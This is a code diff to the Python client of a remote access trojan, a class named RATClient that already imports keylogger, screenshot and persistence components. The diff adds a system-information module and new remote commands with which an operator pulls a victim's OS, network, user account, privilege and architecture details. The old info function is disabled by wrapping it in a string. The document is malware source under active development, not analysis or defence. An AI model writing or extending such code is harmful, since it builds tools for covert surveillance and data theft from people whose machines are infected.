@@ -10,6 +10,7 @@ from protocol import Protocol
 from process_manager import ProcessManager
 from keylogger import Keylogger
 from screenshotManager import take_screenshot, ScreenshotManager
+from UserInfo.System_info import SystemInfo
 
 
 
@@ -30,12 +31,15 @@ class RATClient:
         self.keylogger_enabled = False
         
         self.screenshot_manager = ScreenshotManager()
+        
+        self.system_info = SystemInfo()
                 
 
 
 
     
     def get_system_info(self):
+        '''
         try:
             hostname = socket.gethostname()
             return {
@@ -51,6 +55,21 @@ class RATClient:
         except Exception as e:
             print(f"[-] Error getting system info: {e}")
             return {"platform": "Unknown", "hostname": "Unknown"}
+            '''
+        try:
+            return self.system_info.get_all_system_info()
+        except Exception as e :
+            hostname = socket.gethostname()
+            return {
+                "platform": self.persistence.platform,
+                "platform_version": platform.version(),
+                "hostname": hostname,
+                "architecture": platform.architecture()[0],
+                "processor": platform.processor(),
+                "username": platform.node(),
+                "persistence info": self.persistence.check_persistence(),
+                "python_version": platform.python_version()
+            }
     
     
     def register(self):
@@ -181,6 +200,19 @@ class RATClient:
                 quality = data.get('quality')
                 max_width = data.get('max_width')
                 result = self.screenshot_manager.update_config(quality, max_width)
+            elif action == "get_detailed_system_info":
+                result = self.system_info.get_all_system_info()
+            elif action == "get_os_info":
+                result = self.system_info.get_Os_informations()
+            elif action == "get_network_info":
+                result = {"network": self.system_info.network_info}
+            elif action == "get_user_info":
+                result = {"user": self.system_info.detailed_user_data}
+            elif action == "get_privileges_info":
+                result = {"privileges": self.system_info.get_privileges}
+            elif action == "get_architecture_info":
+                result = {"architecture": self.system_info.get_architecture}
+            
             else:
                 result = {"error": f"Unknown process action: {action}"}
             
